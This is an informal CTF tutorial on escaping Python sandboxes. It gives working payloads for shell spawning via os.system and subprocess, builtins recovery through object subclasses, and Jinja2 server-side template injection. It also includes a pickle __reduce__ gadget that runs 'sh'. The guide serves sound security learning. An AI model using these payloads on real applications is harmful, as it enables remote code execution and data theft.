# The Definitive Guide to Pyjails

## Introduction

A PyJail, or Python Jail, refers to a restricted Python environment designed to limit the capabilities of code executed within it. It is commonly encountered in Capture The Flag (CTF) challenges and security exercises, where the goal is to "escape" the jail and achieve a higher level of access or control, often by accessing restricted functions.

---
## Traditional Pyjails

### Unicode bypass 😈😈😈
Probably the most straightforward way of escaping a pyjail if a SKID wrote it.  

Python normalises italics for some reason, but the characters don't match your normal ASCII table, so standard blacklists can be easily bypassed.  

Note that symbols still remain the same.  

https://lingojam.com/ItalicTextGenerator

### Helpful builtins

`eval()`, `exec()`, `compile()`: execute arbitrary code

### Spawning shells / running system commands

Shell commands: `sh`, `python3`

Helpful functions:
- `os.system()`: probably the most well-known method     
- `subprocess.call()`, `subprocess.run()`: allows you to spawn shells
- `os.popen().read()`, `subprocess.Popen()`, `subprocess.check_output()`: runs commands and returns the output
- `pty.spawn()`: lesser known but still helpful!

Debug mode: `breakpoint()`, `__import__('sys').breakpointhook()`, `pdb.set_trace()`
- starts a python debugger

Python Interactive mode
- `code.interact()`: launches a Python shell
- `os.environ["PYTHONINSPECT"] = "1"`: launches a Python shell when your script finishes execution

### Reading files
`open('flag.txt').read()` (H2 computing doesn't recommend this)

But what if `print()` isn't available...?
- `help()`, `exit()`, `quit()`: essentially `print()`

But what if `read()` isn't accessible? Redirect to `stderr`!
1. unpack your file object into a string: `*open('flag.txt')`
2. then run a faulty conversion!: `int()`, `float()`, `complex()`

### No builtins???
Some pyjails may (attempt to) remove `__builtins__` entirely as shown below.  

```python
eval(code, {"__builtins__": None})
```

Luckily, we can still bypass this! 

```python
().__class__.__base__.__subclasses__()
```

This essentially accesses all subclasses that inherit from the `object` class (ie. EVERY class defined in Python!)

From here, we can access previously restricted functions through some helpful classes.

Here, we access the `warnings` base class from the `catch_warnings` subclass, from which we can then call the `__import__` function.  
```python
[c for c in ().__class__.__base__.__subclasses__() if "catch" in c.__name__][0]()._module.__builtins__["__import__"]
```

We can even directly read variables by overwriting the `sys` module's exception handler to output all global variables.  

```python
(s:=[c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in c.__name__][0].__init__.__globals__['sys'], s.__setattr__('excepthook', lambda *a: s.stdout.write(a[2].tb_frame.f_globals.__str__())), a)
```

### NO PARENTHESES??? 💔💔💔
Probably the most troublesome to bypass...  
Luckily, you can chain decorators to a dummy class to invoke functions without parentheses!

```python
@exec
@input
class C:
    ...
```

### NUKED BUILTINS 😱😱😱
Setting a `__builtins__` function to `None` completely removes the global reference to it (eg. `__builtins__.eval = None`)  

Honestly nothing you can do about it brotato chip ✌🥀, just find another entry point.  

### More stuff
Dynamically accessing attributes
- `getattr()`: for objects
- `__getitem__()`: for dictionaries

Octal encoding
- bypass blacklists within your strings!
- eg: `'\146\154\141\147.txt'` -> `'flag.txt'`

Assigning variables
- the walrus operator treats an assignment as an expression
- only works for variables (no attribute assignment)
- eg: `a:=1`

---
## SSTI

In some Web challenges, you might see a vulnerability like this.  

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "POST":
        return render_template_string(f"Hello {request.form['name']}!")
    else:
        return '''
            <form method="POST">
                Name: <input type="text" name="name">
                <input type="submit" value="Greet">
            </form>
        '''
```

The vulnerability lies in the way the webpage is rendered when the POST request is received. The `f-string` can be abused to retrieve `__builtins__` through Jinja2 introspection.  

```python
{{ self.__init__.__globals__.__builtins__ }}
```

Jinja2 also has a special variable `request`, which refers to the current request being processed and can also be abused to access `__builtins__`

```python
{{ request.application.__globals__.__builtins__ }}
```

An obfuscated way of achieving the above would be using Jinja2's `|` operator, which allows us to pipe the results of filters.  

This is particularly useful if characters like `.` are blacklisted.  

```python
{{ self | attr('__init__') | attr('__globals__') | attr('__getitem__')('__builtins__') }}
```

---
## Pickle
Pickle has a pretty well-known RCE exploit that allows you to run arbitrary commands on deserialisation.  

```python
class Exploit():
    def __reduce__(self):
        return (os.system, ('sh',))

payload = pickle.dumps(Exploit())
```

### Pickle RCE blacklist??? 😱😱😱
Once a blacklist is introduced, things won't be as straightforward.  
Luckily, we can use [Pickora](https://github.com/splitline/Pickora) to convert our obfuscated Python code to Pickle bytecode.  

Read [this article](https://github.com/maurosoria/dirsearch/issues/1073) for more info.  

---

## Additional resources
[very cool cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet)